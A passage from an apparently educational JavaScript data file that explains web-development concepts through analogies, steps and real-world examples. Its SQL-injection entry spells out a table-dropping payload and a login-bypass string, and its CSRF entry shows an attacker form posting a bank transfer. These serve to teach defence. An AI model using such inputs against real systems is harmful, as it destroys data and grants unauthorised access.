            { step: "4", title: "Pull and run", description: "Any server can download and run your container" },
            { step: "5", title: "Isolated execution", description: "Container runs in isolation with its own filesystem" },
        ],
        misunderstanding: {
            wrong: '"Docker containers are like virtual machines"',
            correct: "Containers are <strong>much lighter than VMs</strong>. VMs virtualize hardware; containers share the host OS kernel. Containers start in seconds, VMs take minutes."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Deploying a Node.js app:",
            points: [
                "Without Docker: 'Works on my machine' but breaks in production",
                "With Docker: Package Node.js, dependencies, and code together",
                "Same container runs on dev, staging, and production",
                "No more 'it works on my machine' problems",
            ]
        }
    },

    // Horizontal vs Vertical Scaling
    'horizontal-vs-vertical-scaling': {
        whatItIs: "<strong>Horizontal scaling</strong> means adding more servers to handle traffic, while <strong>vertical scaling</strong> means making your existing server more powerful. Horizontal scales out (more machines), vertical scales up (bigger machine).",
        analogy: {
            title: "The Restaurant Analogy",
            items: [
                { emoji: "🍽️", title: "One Big Kitchen (Vertical)", subtitle: "Bigger stove, more chefs" },
                { emoji: "🏪", title: "Multiple Locations (Horizontal)", subtitle: "More restaurants", highlighted: true },
                { emoji: "👥", title: "Customers (Traffic)", subtitle: "Need to be served" },
            ],
            description: "Vertical scaling is like upgrading to a bigger kitchen with more equipment. Horizontal scaling is like opening multiple restaurant locations. Horizontal is usually better for web apps."
        },
        diagram: [
            { emoji: "📈", title: "Traffic Increases", subtitle: "More Users", color: "primary" },
            { emoji: "⚖️", title: "Choose Strategy", subtitle: "Horizontal or Vertical", color: "secondary" },
            { emoji: "🚀", title: "Scale", subtitle: "Handle Load", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Vertical: Upgrade hardware", description: "Add more RAM, CPU, storage to one server" },
            { step: "2", title: "Horizontal: Add servers", description: "Deploy identical copies of your app" },
            { step: "3", title: "Vertical: Limited by hardware", description: "Eventually hit physical limits" },
            { step: "4", title: "Horizontal: Infinite scaling", description: "Keep adding servers as needed" },
            { step: "5", title: "Horizontal needs load balancer", description: "Distribute traffic across servers" },
        ],
        misunderstanding: {
            wrong: '"Vertical scaling is always cheaper"',
            correct: "<strong>Horizontal scaling is often cheaper long-term</strong>. Vertical has limits and expensive hardware. Horizontal uses commodity servers and scales infinitely."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Netflix scaling:",
            points: [
                "Started with vertical scaling (bigger servers)",
                "Hit limits during peak hours",
                "Switched to horizontal scaling (thousands of servers)",
                "Can now handle 200M+ users simultaneously",
            ]
        }
    },

    // Environment Variables
    'environment-variables': {
        whatItIs: "<strong>Environment variables</strong> are configuration values stored outside your code that change based on where your app runs (development, staging, production). They keep sensitive data like API keys out of your codebase.",
        analogy: {
            title: "The Costume Change Analogy",
            items: [
                { emoji: "👔", title: "Work Clothes (Production)", subtitle: "Professional settings" },
                { emoji: "👕", title: "Casual Clothes (Development)", subtitle: "Comfortable settings", highlighted: true },
                { emoji: "👤", title: "You (The App)", subtitle: "Same person, different outfit" },
            ],
            description: "You're the same person but wear different clothes for different occasions. Your app is the same code but uses different configurations (environment variables) for different environments."
        },
        diagram: [
            { emoji: "💻", title: "Your Code", subtitle: "Reads Variables", color: "primary" },
            { emoji: "🔧", title: "Environment", subtitle: "Provides Values", color: "secondary" },
            { emoji: "⚙️", title: "App Behavior", subtitle: "Adapts to Environment", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Define variables", description: "Create .env file with KEY=value pairs" },
            { step: "2", title: "Load in code", description: "process.env.KEY or similar in your language" },
            { step: "3", title: "Different per environment", description: "Dev uses test DB, production uses real DB" },
            { step: "4", title: "Never commit secrets", description: "Add .env to .gitignore" },
            { step: "5", title: "Set in deployment", description: "Configure on Vercel, Heroku, AWS, etc." },
        ],
        misunderstanding: {
            wrong: '"Environment variables are just for API keys"',
            correct: "Environment variables are for <strong>any configuration that changes per environment</strong>: database URLs, feature flags, debug modes, third-party endpoints, etc."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Typical .env file:",
            points: [
                "DATABASE_URL=postgres://localhost/dev (dev) vs production URL",
                "API_KEY=test_key (dev) vs live_key (production)",
                "DEBUG=true (dev) vs false (production)",
                "STRIPE_KEY=test_key (dev) vs live_key (production)",
            ]
        }
    },

    // SQL vs NoSQL
    'sql-vs-nosql': {
        whatItIs: "<strong>SQL databases</strong> store data in structured tables with predefined schemas (like Excel), while <strong>NoSQL databases</strong> store flexible, unstructured data (like JSON documents). SQL is great for relationships; NoSQL is great for scale and flexibility.",
        analogy: {
            title: "The Filing System Analogy",
            items: [
                { emoji: "📊", title: "SQL (Filing Cabinet)", subtitle: "Organized folders, strict structure" },
                { emoji: "📦", title: "NoSQL (Storage Boxes)", subtitle: "Flexible, throw anything in", highlighted: true },
                { emoji: "📄", title: "Your Data", subtitle: "What you're storing" },
            ],
            description: "SQL is like a filing cabinet with labeled folders—everything has its place. NoSQL is like storage boxes—flexible but you need to remember what's where."
        },
        diagram: [
            { emoji: "💾", title: "Your Data", subtitle: "Needs Storage", color: "primary" },
            { emoji: "🔀", title: "Choose Database", subtitle: "SQL or NoSQL", color: "secondary" },
            { emoji: "📊", title: "Store & Query", subtitle: "Based on Needs", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "SQL: Define schema", description: "CREATE TABLE users (id, name, email)" },
            { step: "2", title: "NoSQL: Just insert", description: "db.users.insert({name: 'John', anything: 'goes'})" },
            { step: "3", title: "SQL: JOIN tables", description: "Combine related data across tables" },
            { step: "4", title: "NoSQL: Embed or reference", description: "Store related data together or link it" },
        ],
        misunderstanding: {
            wrong: '"NoSQL is always faster than SQL"',
            correct: "<strong>Each excels at different things</strong>. SQL is faster for complex queries and relationships. NoSQL is faster for simple lookups and horizontal scaling."
        },
        realWorld: {
            title: "Real-World Example",
            description: "When to use each:",
            points: [
                "SQL (PostgreSQL): Banking app with transactions, relationships, ACID guarantees",
                "NoSQL (MongoDB): Social media posts with flexible schemas, rapid iteration",
                "SQL: E-commerce with orders, products, customers (lots of relationships)",
                "NoSQL: Real-time analytics, logs, IoT data (massive scale, simple queries)",
            ]
        }
    },

    // Static Site Generation
    'static-site-generation': {
        whatItIs: "<strong>Static Site Generation (SSG)</strong> is when you build all your HTML pages at build time, not at request time. The result is pre-rendered HTML files that load instantly and can be served from a CDN.",
        analogy: {
            title: "The Newspaper Analogy",
            items: [
                { emoji: "🏭", title: "Printing Press (Build Time)", subtitle: "Print all copies" },
                { emoji: "📰", title: "Newspapers (Static HTML)", subtitle: "Pre-made, ready to read", highlighted: true },
                { emoji: "📬", title: "Delivery (CDN)", subtitle: "Distribute everywhere" },
            ],
            description: "SSG is like printing newspapers—you create all copies in advance (build time) and distribute them. Readers get instant access without waiting for printing (rendering)."
        },
        diagram: [
            { emoji: "⚙️", title: "Build Time", subtitle: "Generate All Pages", color: "primary" },
            { emoji: "📄", title: "Static HTML", subtitle: "Pre-rendered Files", color: "secondary" },
            { emoji: "🌐", title: "User Request", subtitle: "Instant Load", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Fetch data at build", description: "Query CMS, database, APIs during build" },
            { step: "2", title: "Generate HTML pages", description: "Create static HTML for every page/route" },
            { step: "3", title: "Deploy to CDN", description: "Upload static files to Vercel, Netlify, etc." },
            { step: "4", title: "User requests page", description: "Served instantly from CDN, no server processing" },
            { step: "5", title: "Rebuild on changes", description: "Trigger new build when content updates" },
        ],
        misunderstanding: {
            wrong: '"Static sites can\'t be dynamic or interactive"',
            correct: "SSG sites can be <strong>highly interactive with JavaScript</strong>. The initial HTML is static, but client-side JS adds interactivity, real-time features, etc."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Documentation site with SSG:",
            points: [
                "Build generates HTML for all 1000 doc pages",
                "Deployed to CDN (Vercel, Netlify)",
                "Users get instant page loads (no server rendering)",
                "Perfect for blogs, docs, marketing sites",
            ]
        }
    },

    // State Management
    'state-management': {
        whatItIs: "<strong>State management</strong> is how you store and update data in your application that changes over time. It solves the problem of sharing data between components and keeping your UI in sync with your data.",
        analogy: {
            title: "The Whiteboard Analogy",
            items: [
                { emoji: "📋", title: "Whiteboard (Global State)", subtitle: "Everyone can see" },
                { emoji: "👥", title: "Team Members (Components)", subtitle: "Read and write", highlighted: true },
                { emoji: "🔄", title: "Updates (State Changes)", subtitle: "Everyone sees changes" },
            ],
            description: "State management is like a shared whiteboard in an office. Everyone can see it, anyone can update it, and when someone makes a change, everyone sees the update immediately."
        },
        diagram: [
            { emoji: "🗂️", title: "State Store", subtitle: "Central Data", color: "primary" },
            { emoji: "🔄", title: "Actions", subtitle: "Update State", color: "secondary" },
            { emoji: "📱", title: "Components", subtitle: "React to Changes", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Create store", description: "Define global state (Redux, Zustand, Context)" },
            { step: "2", title: "Components subscribe", description: "Components listen to specific state slices" },
            { step: "3", title: "Dispatch actions", description: "User clicks button → dispatch('ADD_ITEM')" },
            { step: "4", title: "State updates", description: "Reducer/setter updates the state" },
            { step: "5", title: "UI re-renders", description: "All subscribed components update automatically" },
        ],
        misunderstanding: {
            wrong: '"You always need Redux or a state library"',
            correct: "<strong>Start simple with React state/Context</strong>. Only add libraries like Redux when you have complex state logic, many components sharing state, or need time-travel debugging."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Shopping cart state:",
            points: [
                "User adds item → dispatch addToCart(item)",
                "Cart state updates in store",
                "Header shows new cart count",
                "Cart page shows new item",
                "All components stay in sync automatically",
            ]
        }
    },

    // Password Hashing
    'password-hashing': {
        whatItIs: "<strong>Password hashing</strong> is the process of converting passwords into irreversible scrambled strings before storing them. Even if your database is stolen, attackers can't read the original passwords.",
        analogy: {
            title: "The Meat Grinder Analogy",
            items: [
                { emoji: "🥩", title: "Password (Meat)", subtitle: "Original form" },
                { emoji: "⚙️", title: "Hash Function (Grinder)", subtitle: "One-way process", highlighted: true },
                { emoji: "🍔", title: "Hash (Ground Meat)", subtitle: "Can't reverse" },
            ],
            description: "Hashing is like grinding meat—you can turn steak into ground beef, but you can't turn ground beef back into steak. Same with passwords: you can hash them but can't unhash them."
        },
        diagram: [
            { emoji: "🔑", title: "Password", subtitle: "User Input", color: "primary" },
            { emoji: "🔐", title: "Hash Function", subtitle: "bcrypt/Argon2", color: "secondary" },
            { emoji: "💾", title: "Hashed Password", subtitle: "Stored in DB", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "User creates password", description: "password123 (never store this!)" },
            { step: "2", title: "Hash with salt", description: "bcrypt.hash('password123', 10)" },
            { step: "3", title: "Store hash in database", description: "$2b$10$N9qo8uLOickgx2ZMRZoMye..." },
            { step: "4", title: "User logs in", description: "They enter password123 again" },
            { step: "5", title: "Compare hashes", description: "bcrypt.compare(input, storedHash) → true/false" },
        ],
        misunderstanding: {
            wrong: '"Encryption and hashing are the same"',
            correct: "<strong>Encryption is reversible, hashing is not</strong>. Encryption: lock with key (can unlock). Hashing: one-way transformation (can't reverse). Always hash passwords, never encrypt."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Why hashing matters:",
            points: [
                "Database gets hacked and leaked",
                "Attackers see: $2b$10$N9qo8uLOickgx2ZMRZoMye...",
                "Can't reverse the hash to get original password",
                "Users' passwords remain safe (if strong hash like bcrypt)",
            ]
        }
    },

    // CSRF Protection
    'csrf-protection': {
        whatItIs: "<strong>CSRF (Cross-Site Request Forgery)</strong> is an attack where a malicious site tricks your browser into making unwanted requests to a site you're logged into. CSRF tokens prevent this by validating that requests come from your own site.",
        analogy: {
            title: "The Forged Signature Analogy",
            items: [
                { emoji: "✍️", title: "Your Signature (Session)", subtitle: "Proves it's you" },
                { emoji: "😈", title: "Forger (Attacker)", subtitle: "Tricks you into signing", highlighted: true },
                { emoji: "🎫", title: "CSRF Token (Watermark)", subtitle: "Proves it's legitimate" },
            ],
            description: "CSRF is like someone tricking you into signing a blank check. CSRF tokens are like watermarks that prove the signature is legitimate and not forged."
        },
        diagram: [
            { emoji: "🌐", title: "Your Site", subtitle: "Generates Token", color: "primary" },
            { emoji: "🎫", title: "CSRF Token", subtitle: "Included in Form", color: "secondary" },
            { emoji: "✅", title: "Server", subtitle: "Validates Token", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Server generates token", description: "Random string for each session/form" },
            { step: "2", title: "Include in form", description: "<input type='hidden' name='csrf' value='abc123'>" },
            { step: "3", title: "User submits form", description: "Token sent with request" },
            { step: "4", title: "Server validates token", description: "Checks if token matches session" },
            { step: "5", title: "Reject if invalid", description: "Attacker's site can't get valid token" },
        ],
        misunderstanding: {
            wrong: '"HTTPS prevents CSRF attacks"',
            correct: "<strong>HTTPS doesn't prevent CSRF</strong>. HTTPS encrypts data in transit but doesn't validate request origin. You need CSRF tokens or SameSite cookies."
        },
        realWorld: {
            title: "Real-World Example",
            description: "CSRF attack scenario:",
            points: [
                "You're logged into yourbank.com",
                "You visit evil.com (attacker's site)",
                "evil.com has: <form action='yourbank.com/transfer' method='POST'>",
                "Without CSRF protection: Your browser sends your cookies, transfer succeeds!",
                "With CSRF token: Server rejects (evil.com can't get valid token)",
            ]
        }
    },

    // SQL Injection
    'sql-injection': {
        whatItIs: "<strong>SQL injection</strong> is a security vulnerability where attackers insert malicious SQL code into your queries through user input, potentially exposing, modifying, or deleting your entire database.",
        analogy: {
            title: "The Corrupted Order Analogy",
            items: [
                { emoji: "📝", title: "Order Form (Input)", subtitle: "What user enters" },
                { emoji: "😈", title: "Malicious Order (SQL Injection)", subtitle: "Hidden commands", highlighted: true },
                { emoji: "🏭", title: "Kitchen (Database)", subtitle: "Executes commands" },
            ],
            description: "Imagine a restaurant where you write your order. SQL injection is like writing 'Pizza AND give me all the money in the register'. If the kitchen blindly follows orders, disaster happens."
        },
        diagram: [
            { emoji: "😈", title: "Attacker", subtitle: "Malicious Input", color: "primary" },
            { emoji: "💉", title: "SQL Injection", subtitle: "Injected Query", color: "secondary" },
            { emoji: "🗄️", title: "Database", subtitle: "Compromised", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Vulnerable code", description: "query = 'SELECT * FROM users WHERE id = ' + userInput" },
            { step: "2", title: "Attacker inputs", description: "1 OR 1=1; DROP TABLE users;--" },
            { step: "3", title: "Query becomes", description: "SELECT * FROM users WHERE id = 1 OR 1=1; DROP TABLE users;--" },
            { step: "4", title: "Database executes", description: "Returns all users, then deletes the table!" },
            { step: "5", title: "Prevention: Use parameterized queries", description: "query('SELECT * FROM users WHERE id = ?', [userInput])" },
        ],
        misunderstanding: {
            wrong: '"SQL injection only affects old websites"',
            correct: "<strong>SQL injection is still a top vulnerability</strong>. Even modern apps are vulnerable if developers don't use parameterized queries or ORMs properly."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Famous SQL injection:",
            points: [
                "Login form: username = admin' OR '1'='1",
                "Query: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'",
                "OR '1'='1' is always true → bypasses password check",
                "Attacker logs in as admin without knowing password!",
            ]
        }
    },

    // Microservices Architecture
    'microservices': {
        whatItIs: "<strong>Microservices</strong> is an architectural pattern where you build your application as a collection of small, independent services that communicate via APIs. Each service handles one specific business function.",
        analogy: {
            title: "The Restaurant Chain Analogy",
            items: [
                { emoji: "🏢", title: "Monolith (One Big Restaurant)", subtitle: "Everything in one place" },
                { emoji: "🏪", title: "Microservices (Food Court)", subtitle: "Specialized vendors", highlighted: true },
                { emoji: "👥", title: "Customers (Users)", subtitle: "Get what they need" },
            ],
            description: "Monolith is one restaurant doing everything. Microservices is a food court—separate vendors for pizza, sushi, burgers. Each specializes, operates independently, but works together."
        },
        diagram: [
            { emoji: "📱", title: "Client", subtitle: "Makes Request", color: "primary" },
            { emoji: "🚪", title: "API Gateway", subtitle: "Routes to Services", color: "secondary" },
            { emoji: "🔧", title: "Microservices", subtitle: "Independent Services", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Split by business domain", description: "User Service, Order Service, Payment Service" },
            { step: "2", title: "Each service has own database", description: "No shared database between services" },
            { step: "3", title: "Communicate via APIs", description: "HTTP/REST, gRPC, or message queues" },
            { step: "4", title: "Deploy independently", description: "Update Payment Service without touching User Service" },
            { step: "5", title: "Scale independently", description: "Scale Order Service during Black Friday, not User Service" },
        ],
        misunderstanding: {
            wrong: '"Microservices are always better than monoliths"',
            correct: "<strong>Microservices add complexity</strong>. Start with a monolith. Only move to microservices when you have clear team boundaries, scaling needs, or deployment independence requirements."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Netflix microservices:",
            points: [
                "700+ microservices (User, Recommendations, Streaming, Billing, etc.)",
                "Each team owns their service end-to-end",
                "Can deploy 1000+ times per day",
                "If Recommendations fails, Streaming still works",
            ]
        }
    },

    // Database Indexing
    'database-indexing': {
        whatItIs: "<strong>Database indexing</strong> is creating a data structure that allows the database to find rows quickly without scanning the entire table. It's like a book index—instead of reading every page, you look up the page number.",
        analogy: {
            title: "The Library Catalog Analogy",
            items: [
                { emoji: "📚", title: "Books (Database Rows)", subtitle: "All your data" },
                { emoji: "📇", title: "Card Catalog (Index)", subtitle: "Quick lookup", highlighted: true },
                { emoji: "🔍", title: "Search (Query)", subtitle: "Find what you need" },
            ],
            description: "Without an index, finding a book means checking every shelf (slow). With a card catalog (index), you instantly know which shelf to check (fast)."
        },
        diagram: [
            { emoji: "🔍", title: "Query", subtitle: "Find User by Email", color: "primary" },
            { emoji: "📇", title: "Index", subtitle: "Email Index", color: "secondary" },
            { emoji: "⚡", title: "Fast Lookup", subtitle: "O(log n) vs O(n)", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Create index", description: "CREATE INDEX idx_email ON users(email)" },
            { step: "2", title: "Database builds B-tree", description: "Sorted structure for fast lookups" },
            { step: "3", title: "Query uses index", description: "SELECT * FROM users WHERE email = 'john@example.com'" },
            { step: "4", title: "Fast lookup", description: "Finds row in O(log n) instead of O(n)" },
            { step: "5", title: "Trade-off: Slower writes", description: "Inserts/updates must update index too" },
        ],
        misunderstanding: {
            wrong: '"Index every column for maximum speed"',
            correct: "<strong>Indexes have trade-offs</strong>. They speed up reads but slow down writes and use disk space. Only index columns you frequently query or sort by."
        },
        realWorld: {
            title: "Real-World Example",
            description: "E-commerce product search:",
            points: [
                "Without index: Scan 1M products → 2 seconds",
                "With index on 'name': Find product → 10ms (200x faster!)",
                "Index on 'category', 'price' for filtering",
                "Composite index on (category, price) for combined queries",
            ]
        }
    },

    // Message Queues
    'message-queues': {
        whatItIs: "<strong>Message queues</strong> are systems that enable asynchronous communication between services by storing messages until they can be processed. They decouple services, improve reliability, and handle traffic spikes.",
        analogy: {
            title: "The Post Office Analogy",
            items: [
                { emoji: "📮", title: "Sender (Producer)", subtitle: "Sends mail" },
                { emoji: "📬", title: "Post Office (Queue)", subtitle: "Holds mail", highlighted: true },
                { emoji: "👨‍💼", title: "Receiver (Consumer)", subtitle: "Picks up mail" },
            ],
            description: "You don't hand letters directly to recipients. You drop them at the post office (queue), which holds them until the recipient picks them up. Services work the same way."
        },
        diagram: [
            { emoji: "📤", title: "Producer", subtitle: "Sends Message", color: "primary" },
            { emoji: "📦", title: "Queue", subtitle: "Stores Messages", color: "secondary" },
            { emoji: "📥", title: "Consumer", subtitle: "Processes Message", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Producer sends message", description: "Service A sends 'process-order' message" },
            { step: "2", title: "Queue stores message", description: "RabbitMQ/SQS holds message until processed" },
            { step: "3", title: "Consumer pulls message", description: "Service B fetches message when ready" },
            { step: "4", title: "Process and acknowledge", description: "Service B processes order, sends ACK" },
            { step: "5", title: "Message deleted", description: "Queue removes message after ACK" },
        ],
        misunderstanding: {
            wrong: '"Message queues are just for big systems"',
            correct: "<strong>Queues benefit any async workflow</strong>: email sending, image processing, notifications. They prevent blocking, handle failures, and enable scaling."
        },
        realWorld: {
            title: "Real-World Example",
            description: "E-commerce order processing:",
            points: [
                "User places order → message sent to queue",
                "Payment service processes payment (async)",
                "Inventory service updates stock (async)",
                "Email service sends confirmation (async)",
                "If one service is down, messages wait in queue",
            ]
        }
    },

    // Component Architecture
    'component-architecture': {
        whatItIs: "<strong>Component architecture</strong> is building UIs from small, reusable, self-contained pieces that manage their own logic and appearance. It promotes code reuse, maintainability, and separation of concerns.",
        analogy: {
            title: "The LEGO Blocks Analogy",
            items: [
                { emoji: "🧱", title: "LEGO Blocks (Components)", subtitle: "Reusable pieces" },
                { emoji: "🏗️", title: "Builder (Developer)", subtitle: "Assembles blocks", highlighted: true },
                { emoji: "🏰", title: "Castle (App)", subtitle: "Final product" },
            ],
            description: "Components are like LEGO blocks—each piece is self-contained and reusable. You combine them to build complex structures (apps)."
        },
        diagram: [
            { emoji: "🎨", title: "Component", subtitle: "UI + Logic + State", color: "primary" },
            { emoji: "🔄", title: "Props", subtitle: "Data Flow Down", color: "secondary" },
            { emoji: "📱", title: "App", subtitle: "Component Tree", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Define component", description: "function Button({ text, onClick }) { ... }" },
            { step: "2", title: "Encapsulate logic", description: "Component manages its own state and behavior" },
            { step: "3", title: "Accept props", description: "Parent passes data via props" },
            { step: "4", title: "Compose components", description: "<Form><Button /><Input /></Form>" },
            { step: "5", title: "Reuse everywhere", description: "Same Button used across entire app" },
        ],
        misunderstanding: {
            wrong: '"Components must be small and simple"',
            correct: "<strong>Components can be any size</strong>. Balance between too granular (many tiny components) and too large (monolithic components). Aim for single responsibility."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Building a dashboard:",
            points: [
                "Create <Card> component (reusable container)",
                "Create <Chart> component (data visualization)",
                "Create <Table> component (data display)",
                "Compose: <Dashboard><Card><Chart /></Card></Dashboard>",
                "Reuse components across different pages",
            ]
        }
    },

    // Virtual DOM
    'virtual-dom': {
        whatItIs: "<strong>Virtual DOM</strong> is an in-memory representation of the real DOM that frameworks like React use to optimize updates. Instead of updating the real DOM directly, changes are made to the virtual DOM and then efficiently applied.",
        analogy: {
            title: "The Blueprint Analogy",
            items: [
                { emoji: "📋", title: "Blueprint (Virtual DOM)", subtitle: "Plan changes" },
                { emoji: "🔄", title: "Diff (Comparison)", subtitle: "Find differences", highlighted: true },
                { emoji: "🏗️", title: "Construction (Real DOM)", subtitle: "Apply changes" },
            ],
            description: "Before renovating a house, you create blueprints and compare them to current plans. Only then do you make actual changes. Virtual DOM works the same way."
        },
        diagram: [
            { emoji: "⚛️", title: "State Change", subtitle: "Data Updates", color: "primary" },
            { emoji: "🔄", title: "Virtual DOM Diff", subtitle: "Calculate Changes", color: "secondary" },
            { emoji: "🌐", title: "Real DOM", subtitle: "Minimal Updates", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "State changes", description: "User clicks button, state updates" },
            { step: "2", title: "Create new virtual DOM", description: "React creates new virtual representation" },
            { step: "3", title: "Diff algorithm", description: "Compare old vs new virtual DOM" },
            { step: "4", title: "Calculate minimal changes", description: "Find exactly what changed" },
            { step: "5", title: "Update real DOM", description: "Apply only necessary changes (fast!)" },
        ],
        misunderstanding: {
            wrong: '"Virtual DOM is always faster than direct DOM manipulation"',
            correct: "<strong>Virtual DOM is about developer experience</strong>. It's not always faster than optimized direct DOM updates, but it makes complex UIs easier to reason about and maintain."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Updating a todo list:",
            points: [
                "Without Virtual DOM: Re-render entire list (slow)",
                "With Virtual DOM: Diff finds only the new todo item",
                "Only that one item is added to real DOM",
                "Result: Smooth, performant updates even with 1000s of items",
            ]
        }
    },

    // Lazy Loading
    'lazy-loading': {
        whatItIs: "<strong>Lazy loading</strong> is deferring the loading of resources (images, components, code) until they're actually needed. It improves initial page load time and reduces bandwidth usage.",
        analogy: {
            title: "The Restaurant Menu Analogy",
            items: [
                { emoji: "📖", title: "Menu (Page)", subtitle: "What you see first" },
                { emoji: "🍕", title: "Food (Resources)", subtitle: "Loaded when ordered", highlighted: true },
                { emoji: "👨‍🍳", title: "Kitchen (Server)", subtitle: "Prepares on demand" },
            ],
            description: "Restaurants don't cook all dishes upfront. They prepare food when you order it. Lazy loading works the same—load resources when needed, not all at once."
        },
        diagram: [
            { emoji: "🌐", title: "Page Load", subtitle: "Initial Content", color: "primary" },
            { emoji: "👁️", title: "User Scrolls", subtitle: "Resource Needed", color: "secondary" },
            { emoji: "⚡", title: "Load Resource", subtitle: "Just in Time", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Page loads", description: "Only above-the-fold content loads" },
            { step: "2", title: "User scrolls down", description: "Images below fold come into view" },
            { step: "3", title: "Trigger loading", description: "Intersection Observer detects visibility" },
            { step: "4", title: "Load resource", description: "Fetch image/component from server" },
            { step: "5", title: "Display content", description: "Show loaded resource to user" },
        ],
        misunderstanding: {
            wrong: '"Lazy load everything for best performance"',
            correct: "<strong>Lazy load strategically</strong>. Don't lazy load above-the-fold content or critical resources. Focus on below-the-fold images, heavy components, and routes."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Image-heavy blog:",
            points: [
                "Without lazy loading: Load all 50 images (10MB, 5s load time)",
                "With lazy loading: Load 5 visible images (1MB, 1s load time)",
                "As user scrolls, load more images on demand",
                "Result: 5x faster initial load, better user experience",
            ]
        }
    },

    // Code Splitting
    'code-splitting': {
        whatItIs: "<strong>Code splitting</strong> is breaking your JavaScript bundle into smaller chunks that can be loaded on demand. Instead of one huge file, users download only the code they need for the current page.",
        analogy: {
            title: "The Encyclopedia Analogy",
            items: [
                { emoji: "📚", title: "Full Encyclopedia (Monolithic Bundle)", subtitle: "Heavy, all at once" },
                { emoji: "📖", title: "Individual Volumes (Code Chunks)", subtitle: "Load what you need", highlighted: true },
                { emoji: "👤", title: "Reader (User)", subtitle: "Gets relevant content" },
            ],
            description: "Instead of carrying the entire encyclopedia, you take only the volume you need. Code splitting delivers only the JavaScript needed for the current page."
        },
        diagram: [
            { emoji: "📦", title: "Build", subtitle: "Split into Chunks", color: "primary" },
            { emoji: "🌐", title: "Route", subtitle: "Load Route Chunk", color: "secondary" },
            { emoji: "⚡", title: "Execute", subtitle: "Run Only Needed Code", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Define split points", description: "const Home = lazy(() => import('./Home'))" },
            { step: "2", title: "Build creates chunks", description: "Webpack/Vite creates separate files" },
            { step: "3", title: "User visits route", description: "Navigate to /dashboard" },
            { step: "4", title: "Load chunk on demand", description: "Download dashboard.chunk.js" },
            { step: "5", title: "Execute and render", description: "Run code and show page" },
        ],
        misunderstanding: {
            wrong: '"Code splitting is only for large apps"',
            correct: "<strong>Any app benefits from code splitting</strong>. Even small apps have routes users don't visit. Why make them download code for pages they never see?"
        },
        realWorld: {
            title: "Real-World Example",
            description: "E-commerce site:",
            points: [
                "Without splitting: 2MB bundle (Home + Products + Checkout + Admin)",
                "With splitting: 200KB home chunk, load others on demand",
                "User visits home → 200KB (10x smaller!)",
                "User visits checkout → Load checkout chunk (300KB)",
                "Admin users → Load admin chunk (500KB)",
            ]
        }
    },

    // OAuth 2.0
    'oauth-explained': {
        whatItIs: "<strong>OAuth 2.0</strong> is an authorization framework that lets users grant third-party apps access to their data without sharing passwords. It's how 'Sign in with Google' works.",
        analogy: {
            title: "The Hotel Key Card Analogy",
            items: [
                { emoji: "🏨", title: "Hotel (Resource Owner)", subtitle: "Your data" },
                { emoji: "🎫", title: "Key Card (Access Token)", subtitle: "Limited access", highlighted: true },
                { emoji: "🚪", title: "Room (Protected Resource)", subtitle: "What you're accessing" },
            ],
            description: "Hotels don't give you the master key. They give you a key card with limited access (your room, pool, gym). OAuth tokens work the same—limited, revocable access."
        },
        diagram: [
            { emoji: "👤", title: "User", subtitle: "Wants to Authorize", color: "primary" },
            { emoji: "🔐", title: "OAuth Provider", subtitle: "Google/GitHub", color: "secondary" },
            { emoji: "🎫", title: "Access Token", subtitle: "Granted to App", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "User clicks 'Sign in with Google'", description: "Redirected to Google's login" },
            { step: "2", title: "User authorizes app", description: "Grants permission to access email, profile" },
            { step: "3", title: "Google returns authorization code", description: "Temporary code sent to your app" },
            { step: "4", title: "Exchange code for token", description: "Your app trades code for access token" },
            { step: "5", title: "Access user data", description: "Use token to call Google APIs" },
        ],
        misunderstanding: {
            wrong: '"OAuth is for authentication"',
            correct: "<strong>OAuth is for authorization, not authentication</strong>. It grants access to resources, not identity verification. Use OpenID Connect (built on OAuth) for authentication."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Grammarly accessing Google Docs:",
            points: [
                "You click 'Connect Google Docs' in Grammarly",
                "Google asks: 'Allow Grammarly to read/edit your docs?'",
                "You approve → Grammarly gets access token",
                "Grammarly can now check grammar in your docs",
                "You can revoke access anytime in Google settings",
            ]
        }
    },

    // Database Replication
    'database-replication': {
        whatItIs: "<strong>Database replication</strong> is copying data from one database (primary) to one or more databases (replicas) to improve availability, performance, and disaster recovery.",
        analogy: {
            title: "The Library Branches Analogy",
            items: [
                { emoji: "🏛️", title: "Main Library (Primary)", subtitle: "Original books" },
                { emoji: "📚", title: "Branch Libraries (Replicas)", subtitle: "Copies of books", highlighted: true },
                { emoji: "👥", title: "Readers (Users)", subtitle: "Access nearest branch" },
            ],
            description: "Instead of everyone going to the main library, you have branches with copies of books. Closer, faster access. If main library burns down, branches still have the books."
        },
        diagram: [
            { emoji: "💾", title: "Primary DB", subtitle: "Writes", color: "primary" },
            { emoji: "🔄", title: "Replication", subtitle: "Sync Data", color: "secondary" },
            { emoji: "📊", title: "Replica DBs", subtitle: "Reads", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Write to primary", description: "INSERT INTO users VALUES (...)" },
            { step: "2", title: "Primary logs change", description: "Binary log records the write" },
            { step: "3", title: "Replicas pull changes", description: "Replicas read binary log" },
